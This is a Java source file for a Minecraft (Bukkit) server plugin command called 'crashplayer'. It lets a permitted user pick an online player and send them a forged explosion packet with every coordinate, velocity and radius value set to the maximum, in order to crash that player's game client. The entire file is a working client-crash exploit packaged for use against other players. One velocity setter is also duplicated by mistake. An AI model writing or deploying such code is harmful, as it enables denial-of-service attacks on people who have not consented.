package me.dwyur.crashplayer.command;

import me.dwyur.crashplayer.CrashPlayer;
import me.dwyur.crashplayer.wrapper.WrapperPlayServerExplosion;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitTask;

import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

public class CrashPlayerCommand implements CommandExecutor, TabCompleter {

    private final CrashPlayer plugin;

    public CrashPlayerCommand(CrashPlayer plugin) {
        this.plugin = plugin;
        Objects.requireNonNull(plugin.getCommand("crashplayer")).setExecutor(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission("crashplayer.crash")) {
            sender.sendMessage(plugin.getConfig().getString("messages.no-perm"));
            return false;
        }

        if (args.length == 0) {
            sender.sendMessage(plugin.getConfig().getString("messages.usage-command"));
            return false;
        }

        Player target = Bukkit.getPlayer(args[0]);

        if (target == null) {
            sender.sendMessage(plugin.getConfig().getString("messages.player-not-found"));
            return false;
        }

        target.sendTitle(
                plugin.getConfig().getString("messages.title"),
                plugin.getConfig().getString("messages.sub-title"),
                20, 40, 20
        );

        Bukkit.getServer().getScheduler().runTaskLater(plugin, () -> {
            getWrapper().sendPacket(target);
            sender.sendMessage(plugin.getConfig().getString("messages.success-crash"));
        }, 20L);

        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (sender.hasPermission("crashplayer.crash")) {
            return Bukkit.getOnlinePlayers()
                    .stream()
                    .map(Player::getName)
                    .filter(name -> name.startsWith(args[0]))
                    .collect(Collectors.toList());
        }

        return null;
    }

    private WrapperPlayServerExplosion getWrapper() {
        WrapperPlayServerExplosion wrapper = new WrapperPlayServerExplosion();

        wrapper.setX(Double.MAX_VALUE);
        wrapper.setY(Double.MAX_VALUE);
        wrapper.setZ(Double.MAX_VALUE);

        wrapper.setPlayerVelocityX(Float.MAX_VALUE);
        wrapper.setPlayerVelocityY(Float.MAX_VALUE);
        wrapper.setPlayerVelocityX(Float.MAX_VALUE);

        wrapper.setRadius(Float.MAX_VALUE);

        return wrapper;
    }
}
